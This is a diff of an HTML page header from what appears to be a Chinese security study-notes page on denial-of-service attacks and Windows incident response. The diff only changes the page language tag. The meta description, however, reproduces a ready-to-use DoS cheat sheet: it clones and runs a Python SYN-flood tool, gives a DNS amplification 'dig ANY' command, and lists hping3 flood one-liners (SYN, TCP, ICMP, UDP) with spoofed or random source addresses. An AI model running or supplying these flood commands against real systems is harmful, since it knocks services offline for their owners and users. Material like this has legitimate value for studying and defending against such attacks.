@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="zh-cn" dir="ltr">
+<html lang="en-us" dir="ltr">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="DOS补充 SYN洪水攻击（Syn Flood） 1 2 3 git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git cd Python-SYN-Flood-Attack-Tool python3 py3_synflood_cmd.py -t [目标ip] -p [端口号] -c 5 DNS放大攻击 典型的流量放大攻击，以小汇多，利用协议特定进行放大流量\n1 2 3 4 # 安装 sudo apt-get install dnsutils # 使用 dig ANY [域名] @[DNS地址，例如114.114.114.114] 使用后DNS服务器会返回信息（回包）给目标域名，导致端口受阻。\nhping3 定制发送任何的数据包\n参数解释：\n-a伪造数据包\n-q不返回\n-n不解析域名\n-s源端口\n-d字节数\n-p端口\n--flood以flood形式进行攻击\nsyn-flood 1 2 3 sudo hping3 -c 3000 -d 120 -S -w 64 -p [端口号] --flood --rand-source [目标ip] 或（简化版） sudo hping3 -S -P -p 80 --flood --rand-source [目标ip] tcp-flood 1 sudo hping3 -SARUFP -p [端口号] --flood --rand-source [目标ip] icmp-flood 1 sudo hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip] udp-flood 1 sudo hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip] LAND 一种特殊的syn-flood攻击，源地址和目的地址都是受害者，自己和自己完成三次握手\n">
 <title>1.15 DOS补充和Win应急响应</title>
